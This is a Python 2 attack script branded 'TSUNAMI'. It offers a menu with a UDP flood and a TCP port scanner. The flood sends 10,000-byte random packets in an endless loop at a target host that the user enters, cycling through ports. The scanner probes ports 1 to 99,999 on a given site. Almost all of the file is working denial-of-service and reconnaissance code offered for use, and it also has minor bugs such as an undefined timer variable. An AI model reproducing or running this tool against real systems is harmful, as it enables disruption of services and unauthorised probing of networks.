#!/usr/local/bin/python
# coding: latin-1
import sys
import os
import socks
import socket
import time
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

W = '\033[1m'
R = '\033[31m'
N = '\033[0m'
G = '\033[32m'
B = '\033[34m'
Y = '\033[33m'
LB = '\033[1;36m'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
none_ascii = '''

████████╗███████╗██╗   ██╗███╗   ██╗ █████╗ ███╗   ███╗██╗    
╚══██╔══╝██╔════╝██║   ██║████╗  ██║██╔══██╗████╗ ████║██║    
   ██║   ███████╗██║   ██║██╔██╗ ██║███████║██╔████╔██║██║    
   ██║   ╚════██║██║   ██║██║╚██╗██║██╔══██║██║╚██╔╝██║██║    
   ██║   ███████║╚██████╔╝██║ ╚████║██║  ██║██║ ╚═╝ ██║██║    
   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝    
                                                              
'''

print R+(none_ascii.decode('utf-8'))

print N+"""
1: UDP flood

2: web scanner
"""

script = raw_input('choose option :')

if script == "2" :
	website = raw_input(LB+'ENT3R H0ST : ')
	webip = socket.gethostbyname(website)
	print G+webip, N+"IP TO", G+website, "HOST"
	print N+"SCANNING FOR PORTS THIS MAY TAKE AWHILE"
	try:
		for port in range(1,100000):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex((webip, port))
			if result == 0:
				print "\033[1;34m Port {}: 	 Open \033[1;m".format(port)
			sock.close()

	except KeyboardInterrupt:
		print "You pressed Ctrl+C"
		sys.exit()

	except socket.gaierror:
		print 'Hostname could not be resolved. Exiting'
		sys.exit()

	except socket.error:
		print "Couldn't connect to server"
		sys.exit()

	# Checking the time again
	t2 = datetime.now()

	# Calculates the difference of time, to see how long it took to run the script
	total =  t2 - t1

	# Printing the information to screen
	print '\033[1;32m Target Scanned in: \033[1;m', total


if script == "1" :
	ip = raw_input(LB+'ENT3R T@RGET : ')

	hostip = socket.gethostbyname(ip)

	print G+"TARGET HOST", ip
	print "TARGET IP :", hostip

	choice = raw_input(Y+'continue with this host? [y/n] : ')
	if choice == "n" : sys.exit()
	if choice == "y" :
		port = input(B+'> ENT3R P0RT : ')
		os.system("clear")
		print N+"UDP attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
		time.sleep(3)
		print
		sent = 0
		while True:
		     sock.sendto(bytes, (ip,port))
		     sent = sent + 1
		     port = port + 1
		     print R+">>> sending %s packets flooding %s throught port:%s"%(sent,ip,port)
		     if port == 65534:
		       port = 1

	else : print R+"no option called", choice
else : print R+"no option called", script

